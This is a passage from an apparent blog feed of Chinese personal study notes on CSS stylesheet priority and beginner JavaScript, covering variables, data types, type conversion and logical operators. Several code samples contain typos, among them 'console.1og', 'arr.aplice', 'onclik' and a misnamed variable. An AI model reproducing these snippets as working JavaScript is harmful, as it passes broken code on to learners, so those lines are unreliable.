<span class="attribute">font-size</span>:<span class="number">8pt</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而内部样式表拥有针对 h3 选择器的两个属性：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h3</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">20pt</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如拥有内部样式表的这个页面同时与外部样式表链接，那么 h3 得到的样式是：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">color</span>:red;</span><br><span class="line"><span class="attribute">text-align</span><span class="selector-pseudo">:right</span>;</span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">20pt</span>;</span><br></pre></td></tr></table></figure><p>可以看到因为内部样式表的优先级高，先使用了内部样式表，然后又继承了外部样式表中的 <code>color</code> 属性</p></li></ul></li></ol><h1 id="编程快捷键"><a href="#编程快捷键" class="headerlink" title="编程快捷键"></a>编程快捷键</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">w200+h200+bgc//设置class中的width、height和background-color</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web前端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端开发 </tag>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『web前端开发』javascript学习</title>
      <link href="/posts/d00f.html"/>
      <url>/posts/d00f.html</url>
      
        <content type="html"><![CDATA[<p>本文为个人在学习JS过程中记录的笔记，主要基于 <a href="https://www.bilibili.com/video/BV1Y84y1L7Nn">黑马程序员前端JavaScript入门到精通</a> 视频和 <a href="https://www.runoob.com/js">JavaScript | 菜鸟教程</a> 进行学习。</p><p>目前暂时学习完视频P99，后续有机会再进行学习更新</p><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol><li><p><strong>定义</strong>：javascript是一种执行在客户端的脚本语言，不需要编译，在运行过程中由js解释器（js引擎）来逐行进行解释并执行</p><ul><li>常见的js引擎，如chrome使用的v8引擎等</li><li>虽然javascript最初是用于前端开发，但是现在已经可以用于多种开发，如node.js就是内置了v8引擎，使得js脚本可以在浏览器之外的环境下运行，用于编写服务端代码等。</li></ul></li><li><p><strong>JS 的作用</strong>：</p><ul><li><p>表单动态校验 (密码强度检测) ( <strong>JS 产生最初的目的</strong>)</p><blockquote><p>比如一个表单字段的输入并不符合规范，如果需要发给服务端，服务端收到之后判断发现并不合规，再返回就会产生比较大的延迟</p></blockquote></li><li><p>网页特效</p></li><li><p>服务端开发（Node.js）</p></li><li><p>桌面程序（Electron）</p></li><li><p>App（Cordova）</p></li><li><p>控制硬件-物联网（Ruff）</p></li><li><p>游戏开发（cocos2d-js）</p></li></ul></li><li><p><strong>浏览器如何执行JS</strong></p><p>浏览器分成两部分：渲染引擎和JS引擎</p><ul><li>渲染引擎（内核）：用来<u>解析HTML与CSS</u> ，比如chrome浏览器的blink ,老版本的webkit</li><li>JS引擎（JS解释器）：用来读取网页中的JS代码，逐行解释源码并将其转化为机器语言由计算机执行。比如chrome浏览器的V8</li></ul></li><li><p><strong>JS的三部分组成</strong></p><ul><li>核心（ECMAScript）：即JS语法</li><li>Web APIs：即通过JS去操作html和浏览器<ul><li>文档对象模型（Document Object Model，简称DOM） ：通过DOM提供的接口可以对页面上的各种元素进行操作(大小、位置、颜色等)。</li><li>浏览器对象模型（Browser Object Model，简称BOM）：提供了独立于内容的、可以与浏览器窗进行互动的对象结构。通过BOM可以操作浏览器窗口，比如弹出框、控制浏览器跳转、获取分辨率等。</li></ul></li></ul></li><li><p><strong>JS的书写位置</strong></p></li></ol><p>（1）<strong>内部 javascript</strong></p><p>Javascript 脚本代码可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和  <code>&lt;head&gt;</code>  部分中。</p><ul><li><p>写在 <code>&lt;head&gt;</code>  部分中的js脚本<u>在页面内容加载之前被加载和执行</u></p><ul><li>这对于需要在页面加载之前进行的一些初始化操作非常有用，例如预加载某些数据或设置全局变量。</li><li>由于脚本在页面内容加载之前执行，如果脚本执行时间较长，可能会导致页面加载变慢，影响用户体验。</li><li>如果脚本需要操作 DOM 元素，而这些元素尚未加载完成，可能会导致错误。</li></ul></li><li><p>写在 <code>&lt;body&gt;</code> 部分的js脚本在页面内容加载完成后执行</p><ul><li><p>可以直接写到元素的内部，不需要使用script标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;唐伯虎&quot;</span> <span class="attr">onclik</span>=<span class="string">&quot;alert(&#x27;秋香&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者写在body的尾部，使用 <code>script</code> 标签</p></li><li><p>所有 DOM 元素都已经可以被操作，从而避免了在操作 DOM 时遇到的错误。</p></li><li><p>可以在页面加载后执行一些需要立即生效的脚本，例如初始化页面内容或绑定事件处理程序。</p></li><li><p>在 <code>&lt;body&gt;</code> 部分放置大量脚本代码可能会导致 HTML 文件过于冗长，影响代码的可读性和可维护性。</p></li></ul></li></ul><blockquote><p>如果脚本不依赖于页面内容，可以放在 <code>&lt;head&gt;</code> 部分，以便尽早加载和执行。</p><p>如果脚本需要操作页面中的 DOM 元素，通常放在 <code>&lt;body&gt;</code> 部分，或者放在 <code>&lt;body&gt;</code> 底部，以确保页面内容已经完全加载。</p></blockquote><p>（2）<strong>外部 javascript</strong></p><p>可以引入外部 JavaScript 文件，外部文件通常包含被多个网页使用的代码。可以实现 HTML 和 JavaScript 的分离，提高代码的可读性和可维护性。使用 <code>&lt;script&gt;</code> 标签中的 src 属性来标注 js 文件的位置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意使用外部加载js的时候，script标签中间不能写代码</span></span><br><span class="line">&lt;script src=<span class="string">&quot;my.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li><strong>JS代码执行顺序</strong><ul><li>按HTML文档流顺序执行JavaScript代码</li><li>alert()和prompt()它们会跳过页面渲染先被执行</li></ul></li></ol><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="输入和输出"><a href="#输入和输出" class="headerlink" title="输入和输出"></a>输入和输出</h2><ol><li><p><strong>输出语法</strong></p><p>（1）document.write</p><p>向body内输出内容，如果输出的内容为标签，会被解析成网页元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;我是div标签&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;h1&gt;我是标题&lt;/h1&gt;&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>（2）alert</p><p>页面弹出警告窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="number">5</span> + <span class="number">6</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>（3）console.log</p><p>控制台输出（页面中并没有效果），用于程序员的调试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>输入语法</strong></p><p>（1）prompt</p><p>显示一个对话框，对话框中包含一条文字信息，用来提示用户输入文字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">prompt</span>(<span class="string">&#x27;输入你的年龄：&#x27;</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="变量和常量"><a href="#变量和常量" class="headerlink" title="变量和常量"></a>变量和常量</h2><ol><li><p><strong>变量</strong></p><p>初始化（声明+赋值）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> age = <span class="number">18</span>,username = <span class="string">&#x27;isoda&#x27;</span></span><br></pre></td></tr></table></figure><ul><li><p>注意一条语句中声明的多个变量不可以同时赋同一个值:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这种声明方法是错误的，定义了x,y为undefined，z为1。</span></span><br><span class="line"><span class="keyword">let</span> x,y,z=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>旧版本使用 <code>var</code> 来定义变量，目前的版本都使用 <code>let</code> 来进行定义</p><p>var 相比 let 存在很多的缺点：</p><ul><li>可以先使用在声明（打印出来为undefined），不合理</li><li>var声明过的变量可以多次重复声明，不合理</li><li>比如变量提升、全局变量、没有块级作用域等等</li></ul></li></ul></li><li><p><strong>常量</strong></p><p><u>声明的时候必须初始化</u>，且不允许重新赋值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">PI</span> = <span class="number">3.141592653589793</span>;</span><br><span class="line"><span class="variable constant_">PI</span> = <span class="number">3.14</span>;      <span class="comment">// 报错</span></span><br><span class="line"><span class="variable constant_">PI</span> = <span class="variable constant_">PI</span> + <span class="number">10</span>;   <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure></li></ol><blockquote><p>在开发的时候：</p><ul><li>基本数据类型：推荐先定义数据为常量const，后续发现这个数据需要修改再改为变量let</li><li>对象数据类型：定义对象为const<ul><li>仍然可以追加对象中的元素，因为对象数据类型存储的是指向对象的地址，虽然对象变了但是地址没有改变</li><li>不能将其指向新的对象，这样地址就产生了改变</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;blue&#x27;</span>]</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="string">&#x27;blue&#x27;</span>)<span class="comment">//没有报错</span></span><br><span class="line">arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]<span class="comment">//产生报错</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ol><li><p><strong>数据类型分类</strong></p><p>主要可以分成两大类</p><ul><li><strong>值类型(基本类型)</strong>：字符串（String）、数字(Number)、布尔(Boolean)、空（Null）、未定义（Undefined）、Symbol。</li><li><strong>引用数据类型（对象类型）</strong>：对象(Object)、数组(Array)、函数(Function)，还有两个特殊的对象：正则（RegExp）和日期（Date）。</li></ul><blockquote><p>这两种类型的区别可见编程基础.计算机基础知识.堆栈</p></blockquote></li><li><p><strong>基本数据类型</strong></p><p><strong>1）字符串</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let answer = &quot;He is called &#x27;Johnny&#x27;&quot;;</span><br><span class="line">let answer = &#x27;He is called &quot;Johnny&quot;&#x27;;</span><br></pre></td></tr></table></figure><ul><li><p><u>字符串拼接</u>：通过 <code>+</code> 运算符，或者反引号</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1. 通过 + 运算符</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">15</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;我今年&quot;</span>+age+<span class="string">&quot;岁了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 通过 `` 号</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">15</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`我今年<span class="subst">$&#123;age&#125;</span>岁了`</span>)</span><br></pre></td></tr></table></figure></li></ul><p><strong>2）数字</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x1 = <span class="number">34.00</span>      <span class="comment">//使用小数点来写</span></span><br><span class="line"><span class="keyword">let</span> x2 = <span class="number">34</span>                 <span class="comment">//不使用小数点来写</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="number">123e5</span>          <span class="comment">// 12300000</span></span><br></pre></td></tr></table></figure><p><strong>3）布尔</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="literal">true</span></span><br><span class="line"><span class="keyword">let</span> y = <span class="literal">false</span></span><br></pre></td></tr></table></figure><p><strong>4）空（null）</strong></p><p>null表示赋值了，但是内容为空。一般作为尚未创建的对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="literal">null</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br></pre></td></tr></table></figure><blockquote><p>注意 undefined 和 null 的区别</p><p>null表示空，加上1的话就表示1了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>,<span class="title function_">log</span>(<span class="literal">undefined</span> + <span class="number">1</span>) <span class="comment">//NaN</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span>+<span class="number">1</span>)<span class="comment">//1</span></span><br></pre></td></tr></table></figure></blockquote><p><strong>5）未定义（Undefined）</strong></p><p>声明了的对象未赋值，打印出来就是Undefined</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x)</span><br></pre></td></tr></table></figure><p><strong>6）数组</strong></p><p>javascript中列表和数组是一个概念， 没有区别</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">let</span> cars = [<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>]</span><br><span class="line">   <span class="keyword">let</span> myCars = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Saab&quot;</span>,<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>);</span><br><span class="line">   <span class="keyword">let</span> myCars=<span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// 数组的操作</span></span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(cars[<span class="number">0</span>],cars[<span class="number">2</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cars.<span class="property">length</span>)</span><br></pre></td></tr></table></figure><ul><li><p>数组添加新数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// push()方法将一个或多个元素添加到数组末尾，返回数组的新长度</span></span><br><span class="line"> length = arr.<span class="title function_">push</span>(a,b,c)</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// unshift()方法将一个或多个元素添加到数组开头，返回数组的新长度</span></span><br><span class="line">length = arr.<span class="title function_">unshift</span>(a,b,c)</span><br></pre></td></tr></table></figure></li><li><p>数组删除数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pop()方法从数组中删除最后一个元素，并返回该元素的值</span></span><br><span class="line">delete_data = arr.<span class="title function_">pop</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// shift()方法从数组中删除第一个元素，并返回该元素的值</span></span><br><span class="line">delete_data = arr.<span class="title function_">shift</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// splice()方法从start位置开始删除掉deletCount个元素</span></span><br><span class="line">arr.<span class="title function_">splice</span>(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> arr.<span class="title function_">aplice</span>(<span class="number">1</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>检测数据类型</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> x</span><br></pre></td></tr></table></figure></li><li><p><strong>数据类型转换</strong></p><ul><li><p><strong>为什么需要数据类型转换：</strong></p><p>表单、prompt获取到的数据默认是字符串类型的，当做数字类型等会产生错误</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;10000&#x27;</span>+<span class="string">&#x27;2000&#x27;</span>) <span class="comment">// 输出结果 100002000</span></span><br></pre></td></tr></table></figure></li><li><p><strong>隐式转换</strong></p><p>某些运算符被执行时，系统内部自动将数据类型进行转换，这种转换称为隐式转换。</p><ul><li><code>+</code> 号两边只要有一个是字符串,都会把另外一个转成字符串</li><li>除了 <code>+</code> 以外的算术运算符，比如 <code>- * /</code> 等都会把数据转成数字类型</li><li><code>+</code> 号作为正号解析可以转换成数字型</li><li>任何数据和字符串<u>相加</u>，都视作字符串拼接，结果都是字符串</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span> + <span class="number">1</span>)<span class="comment">//2</span></span><br><span class="line"><span class="variable language_">console</span>. <span class="title function_">log</span>(<span class="string">&#x27;pink&#x27;</span> + <span class="number">1</span>)<span class="comment">//pink1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span> + <span class="string">&#x27;2&#x27;</span>) <span class="comment">//22</span></span><br><span class="line"><span class="variable language_">console</span>.1og(<span class="number">2</span> - <span class="number">2</span>)<span class="comment">//0</span></span><br><span class="line"><span class="variable language_">console</span>.1og(<span class="number">2</span> - <span class="string">&#x27;2&#x27;</span>) <span class="comment">//0</span></span><br><span class="line"><span class="variable language_">console</span>.1og(+<span class="string">&#x27;123&#x27;</span>) <span class="comment">//可以看作正负号，将字符串转化为数字型</span></span><br></pre></td></tr></table></figure></li><li><p><strong>显示转换</strong></p><p>编写程序时过度依靠系统内部的隐式转换是不严禁的，因为隐式转换规律并不清晰，大多是靠经验总结的规律。为了避免因隐式转换带来的问题，通常需要对数据进行显示转换。</p><p>即：自己写代码告诉系统该转成什么类型</p></li><li><p><strong>常见的数据类型转换方法</strong></p><p><strong>1）字符串转换数字</strong></p><ul><li><p>Number()</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Number</span>(<span class="string">&quot;3.14&quot;</span>)    <span class="comment">// 返回 3.14</span></span><br><span class="line"><span class="title class_">Number</span>(<span class="string">&quot; &quot;</span>)       <span class="comment">// 空字符串返回 0 </span></span><br><span class="line"><span class="title class_">Number</span>(<span class="string">&quot;&quot;</span>)        <span class="comment">// 空字符串返回 0</span></span><br><span class="line"><span class="title class_">Number</span>(<span class="string">&quot;12px&quot;</span>)   <span class="comment">// 其他非纯数字字符串返回 NaN</span></span><br></pre></td></tr></table></figure></li><li><p>parseInt()：只保留整数部分</p><p>注意parseInt()和parseFloat()中字符串的开头必须是数字，不然都会返回NaN</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&quot;12px&quot;</span>)   <span class="comment">// 返回12</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&quot;12.13&quot;</span>)   <span class="comment">// 返回12</span></span><br></pre></td></tr></table></figure><blockquote><p>注意这里和上面Number处理非纯数字字符串的区别，这里会直接过滤掉字符部分</p></blockquote></li><li><p>parseFloat()：保留小数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&quot;12px&quot;</span>)   <span class="comment">// 返回12</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&quot;12.13px&quot;</span>)   <span class="comment">// 返回12.13</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>2）数字转换字符串</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用String</span></span><br><span class="line"><span class="title class_">String</span>(x)         <span class="comment">// 将变量 x 转换为字符串并返回</span></span><br><span class="line"><span class="title class_">String</span>(<span class="number">123</span>)       <span class="comment">// 将数字 123 转换为字符串并返回</span></span><br><span class="line"><span class="title class_">String</span>(<span class="number">100</span> + <span class="number">23</span>)  <span class="comment">// 将数字表达式转换为字符串并返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用toString()</span></span><br><span class="line">x.<span class="title function_">toString</span>()</span><br><span class="line">(<span class="number">123</span>).<span class="title function_">toString</span>()</span><br><span class="line">(<span class="number">100</span> + <span class="number">23</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p><strong>3）转换为布尔值</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Boolean</span>(a)</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>数据类型存储方式</strong></p><ul><li><p>基本数据类型的存储：存储的是数据的值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1 = <span class="number">10</span></span><br><span class="line"><span class="keyword">let</span> num2 = num1</span><br><span class="line">num = <span class="number">20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num1)<span class="comment">//输出为10</span></span><br></pre></td></tr></table></figure></li><li><p>对象数据类型的存储：存储的是地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123;</span><br><span class="line">    <span class="attr">age</span>:<span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = obj1</span><br><span class="line">obj2.<span class="property">age</span> = <span class="number">20</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj1.<span class="property">age</span>)<span class="comment">//输出为20</span></span><br></pre></td></tr></table></figure><blockquote><p>因为obj2中存储的是和obj1相同的地址，所以修改obj2映射到堆中的对象值后，obj1也是映射到这个地址，所以obj1的结果也产生了改变</p></blockquote></li></ul></li></ol><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><ol><li><p><strong>运算符的优先级</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240714171016207.png" alt="image-20240714171016207"></p><ul><li><p><code>===</code> 判断值和类型是否完全相同，返回值为 boolean</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 因为 === 优先级高，先计算得到值相同类型不同，返回false</span></span><br><span class="line"><span class="keyword">let</span> c = <span class="number">2</span> === <span class="string">&quot;2&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(c)<span class="comment">// 输出为false</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>逻辑中断</strong></p><p><strong>1）原理</strong>：当有多个表达式（值）时，左边表达式的值可以确定时，就不再继续运算右边表达式的值。</p><blockquote><p><code>0</code>、<code>&quot; &quot; （空字符串）</code>、<code>&#39; &#39;（空字符串）</code>、<code>null（空值）</code>、<code>undefined（未定义）</code>、<code>NaN（非数值）</code>都表示为<code>false</code>，除这些之外的为true。</p></blockquote><p>例如：这里因为123为真，所以直接返回123，右边的num++并没有执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="number">123</span> || num++);  <span class="comment">//逻辑中断，返回值123，之后的代码不再继续运行</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(num);<span class="comment">//num的值仍为0</span></span><br></pre></td></tr></table></figure><p><strong>2）逻辑与</strong></p><ul><li>如果第一个表达式的值为真，则返回表达式2</li><li>如果第一个表达式的值为假，则返回表达式1</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">false</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span>&lt;<span class="number">3</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">undefined</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//undefined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="literal">null</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//null</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">0</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//0，因为0是看作假的</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">10</span> &amp;&amp; <span class="number">20</span>)<span class="comment">//20</span></span><br></pre></td></tr></table></figure><p><strong>3）逻辑或</strong></p><ul><li>如果第一个表达式的值为真，则返回表达式1</li><li>如果第一个表达式的值为假，则返回表达式2</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="number">123</span> || <span class="number">456</span> );         <span class="comment">//  123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="number">0</span> ||  <span class="number">456</span> );          <span class="comment">//  456</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>( <span class="number">123</span> || <span class="number">456</span> || <span class="number">789</span> );  <span class="comment">//  123</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="语句"><a href="#语句" class="headerlink" 